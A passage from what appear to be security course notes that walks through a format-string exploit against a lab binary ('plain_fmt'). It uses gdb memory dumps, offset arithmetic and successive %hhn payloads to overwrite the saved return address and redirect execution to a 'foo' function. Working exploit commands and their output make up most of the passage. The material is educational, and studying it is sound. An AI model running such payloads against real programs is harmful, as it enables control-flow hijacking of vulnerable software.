0xbffff610: 0x00000002  0xbffff6d4  0xbffff6e0  0xb7e4d42d
0xbffff620: 0xb7fc43c4  0xb7fff000  0x080484db  0xb7fc4000
0xbffff630: 0x080484d0  0x00000000  0x00000000  0xb7e33a83
(gdb) x/x $ebp+0x4
0xbffff63c: 0xb7e33a83
```

So the address of the return is at 0xbffff63c. And taking a full
programatic step after the assignment of 0xdeadbeef, we can see what
address deadbeef is at:

``` {.example}
(gdb) n
14    printf(argv[1]);
(gdb) x/12x $esp
0xbffff610: 0x00000002  0xbffff6d4  0xbffff6e0  0xb7e4d42d
0xbffff620: 0xb7fc43c4  0xb7fff000  0x080484db  0xdeadbeef
0xbffff630: 0x080484d0  0x00000000  0x00000000  0xb7e33a83
```

Let's take account of what we know: (1) The return address is at
0xbffff63c and (2) the address of deadbeef is 0x10 less at 0xbffff62c.
Let's continue the program:

``` {.example}
(gdb) c
Continuing.
AAAABBBBCCCCDDDDbffff6d4.2f000000.bffff6d4.656d6f68.bffff6d4.6573752f.bffff6d4.69672f72.0xdeadbeef
[Inferior 1 (process 2980) exited with code 012]
```

Looking at the output, we see the address 0xbffff6d4. This is a valid
address and we can use this to calculate an offset from. So, the address
of deadbeef is 0xa8 bytes offset (0xbfff6d4-0xa8), and the return
address is offset 0x98 from that address (0xbffff6d4-0x98).

Now, we can take that information *outside* of gdb to try and determine
what is going on and find the address we are looking for.

``` {.example}
user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
AAAABBBBCCCCDDDDbffff724.41414141.bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
```

Now we see the address 0xbffff724. Using the same calculation, the
address of deadbeef should be at 0xbffff724-0xa8, or 0xbffff67c. And the
address of return address should be 0xbffff68c. Let's see if we can
cause some mischief:

``` {.example}
user@si485H-base:demo$ ./plain_fmt $(printf "\x8c\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
???BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
(...)
```

INFINITE LOOP! We are on to something here. Let's try some other
addresses within the return address range.

``` {.example}
user@si485H-base:demo$ ./plain_fmt $(printf "\x8d\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[496993.978183] plain_fmt[3047]: segfault at 41007d0c ip b7e31983 sp bffff690 error 6 in libc-2.19.so[b7e1a000+1a8000]
user@si485H-base:demo$ ./plain_fmt $(printf "\x8e\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[497001.269591] plain_fmt[3052]: segfault at b7193a83 ip b7193a83 sp bffff690 error 14
user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
Segmentation fault (core dumped)
```

Notice the 0x19 that is moving through the return address range, that
means we are in the money and we can start writing some bytes to that
address.

Writing Byes
------------

Like before, we want to write from most significant to least
significant, so we can setup the following format:

``` {.example}
user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$008x.%123\$hhn.%1\$008x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
????????????????bffff724..bffff724..bffff724..bffff724..0xdeadbeef
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[497630.497343] plain_fmt[3118]: segfault at 19232d37 ip 19232d37 sp bffff690 error 14

```

And then look at the dmesg output to track our progress. The goal is to
write to address of foo:

``` {.example}
user@si485H-base:demo$ objdump -d plain_fmt | grep foo
0804847d <foo>:
```

The first byte we need to write is 0x08 and we are currently writing
0x19, so we wrap around:

``` {.example}
user@si485H-base:demo$ python -c "print (0x100 - 0x19) + 0x08 + 8"
247
user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$008x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
????????????????                                                                                                                                                                                                                                               bffff724..bffff724..bffff724..bffff724..0xdeadbeef
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[497667.448239] plain_fmt[3127]: segfault at 8121c26 ip 08121c26 sp bffff690 error 14
```

Next, we need 0x04 but we are writing 12 when we need 04.

``` {.example}
user@si485H-base:demo$ python -c "print (0x100 - 0x12) + 0x04 + 8"
250
user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
????????????????                                                                                                                                                                                                                                               bffff724..                                                                                                                                                                                                                                                  bffff724..bffff724..bffff724..0xdeadbeef
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[497734.158660] plain_fmt[3136]: segfault at 8040e18 ip 08040e18 sp bffff690 error 14 in plain_fmt[8048000+1000]
```

Next, we need 0x84 and we are writing 0e:

``` {.example}
user@si485H-base:demo$ python -c "print ((0x100 - 0x0e) + 0x84 + 8)%256"
126
user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$126x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
????????????????                                                                                                                                                                                                                                               bffff724..                                                                                                                                                                                                                                                  bffff724..                                                                                                                      bffff724..bffff724..0xdeadbeef
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[497815.575610] plain_fmt[3146]: segfault at 2 ip 00000002 sp bffff694 error 14 in plain_fmt[8048000+1000]
```

Uh oh .... what happened? Well, now that we are wrting 0x080484.. WE are
now in the valid address ranges for what we want to write. So we can no
longer rely on the dmesg output directly. Instead, we jumped to a valid
address and the segfaulted somewhere else.

But all is not lost. Instead, we can now just do two calculations at
once. Consider that the last time we wrote 126 bytes and the value in
the least significant byte before that change was 0x18. That means that
value should now be at: 0x18+126-8 = 0x8e. (The -8 was to account for
the 8 bytes already printed within the format for 0x008).

If we are writing 0x8e, what we want to write 7d, that means for the
last format we should be able to do this"

``` {.example}
user@si485H-base:demo$ python -c "print ((0x100 - 0x8e) + 0x7d + 8)%256"
247
user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$126x.%125\$hhn.%1\$247x.%126\$hhn.%7\$#08x 
????????????????                                                                                                                                                                                                                                               bffff724..                                                                                                                                                                                                                                                  bffff724..                                                                                                                      bffff724..                                                                                                                                                                                                                                               bffff724..0xdeadbeef
Go Navy!
Segmentation fault (core dumped)
```

And, "Go Navy!" Boom.

